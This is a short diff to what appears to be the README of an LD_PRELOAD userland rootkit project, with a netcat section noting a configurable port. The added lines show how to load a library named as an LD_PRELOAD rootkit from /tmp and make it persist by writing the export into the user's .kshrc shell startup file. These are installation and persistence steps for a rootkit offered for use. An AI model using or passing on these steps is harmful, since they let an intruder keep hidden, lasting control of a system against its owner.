@@ -15,6 +15,12 @@ $ LD_PRELOAD=./libmalloct.so ls -aphl /home/$USER/
 
 $ LD_PRELOAD=./libmalloct.so ls -hl /tmp/*
 
+$ export LD_PRELOAD=/tmp/yourdogshitldprootkit.so
+
+$ echo "export LD_PRELOAD=/tmp/yourdogshitldprootkit.so" > /home/$USER/.kshrc
+
+> set to which shell you are using
+
 # nc
 **you can set custom port in src/config.h**
 
